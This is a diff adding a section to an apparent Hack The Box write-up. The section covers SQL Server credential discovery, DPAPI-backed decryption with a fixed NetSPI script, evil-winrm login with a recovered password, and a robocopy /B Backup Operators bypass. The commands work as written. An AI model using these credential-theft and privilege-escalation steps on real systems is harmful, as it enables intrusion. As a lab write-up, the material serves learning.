@@ -259,8 +259,102 @@ HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'powershell -c "
 
 
 
+---
+
+### SQL Server Credential Discovery
 
 
+During the WinPEAS enumeration, we noticed that the local user `svc_wtbackup` was a member of the **Backup Operators** and **Remote Management Users** groups. This made `svc_wtbackup` a high-value target for privilege escalation.
+
+However, we were currently operating as `svc_sql`. We needed to find a way to pivot to `svc_wtbackup`.
+
+#### 1. Enumerating SQL Credentials
+
+Since `svc_sql` is the SQL Server service account and has local sysadmin privileges on the SQL instance, we can use `sqlcmd` locally to enumerate the database configuration. We queried the `sys.credentials` table to look for stored secrets:
+
+
+
+```
+sqlcmd -S localhost -E -C -Q "SELECT credential_id, name, credential_identity FROM master.sys.credentials;"
+```
+
+**Output:**
+
+```text
+
+credential_id name            credential_identity
+------------- --------------- --------------------
+65549         WTArchiveCred   UNCLAIMED\svc_wtbackup
+```
+
+
+We found a SQL Server credential named `WTArchiveCred` that was explicitly mapped to the Windows account `UNCLAIMED\svc_wtbackup`.
+
+
+
+---
+
+
+#### The Decryption Attempt and the `LEN()` Bug
+
+SQL Server stores credentials encrypted using the Service Master Key (SMK), which is in turn protected by Windows DPAPI (using entropy from the registry). Because `svc_sql` is the service account, it has the necessary permissions to read these keys and decrypt the credential.
+
+We used the NetSPI `Get-MSSQLCredentialPasswords.psm1` script to automate this decryption. However, the script returned an incomplete password (`W0rldTr@cer_`), causing WinRM authentication to fail.
+
+**The Bug:**  
+The legacy script uses the SQL `LEN()` function to calculate the size of the encrypted binary blob. Because the final byte of the AES ciphertext was a null byte (`0x00`), `LEN()` truncated the result, chopping off the final AES block.
+
+To fix this, we modified the script to use `DATALENGTH()` instead of `LEN()`:
+
+```sql
+
+-- Original (Broken): substring(imageval, $($ivlen+5), len(imageval)-$($ivlen+4))
+-- Modified (Working): substring(imageval, $($ivlen+5), datalength(imageval)-$($ivlen+4))
+```
+
+With the modified script, the full binary blob was extracted and decrypted, revealing the complete plaintext password: `W0rldTr@cer_B@ckup1`.
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
+
+
+
+
+
+## Authenticating as the Backup Operator
+
+
+```
+
+evil-winrm -i 10.129.206.30 -u svc_wtbackup -p 'W0rldTr@cer_B@ckup1'
+
+
+robocopy /B C:\Users\Administrator\Desktop C:\Users\svc_wtbackup\Documents root.txt
+
+
+
+type C:\Users\svc_wtbackup\Documents\root.txt
+
+
+```
+
+
+> - Because `svc_wtbackup` belongs to the **Backup Operators** group, the `/B` flag allowed `robocopy` to completely bypass the Windows file permissions (ACLs) on the Administrator's desktop and successfully copy the file.
+
+
+
+<img width="1128" height="226" alt="image" src="https://github.com/user-attachments/assets/82bf4085-36c0-4eb0-96a8-d2fba3fce41a" />
 
 
 
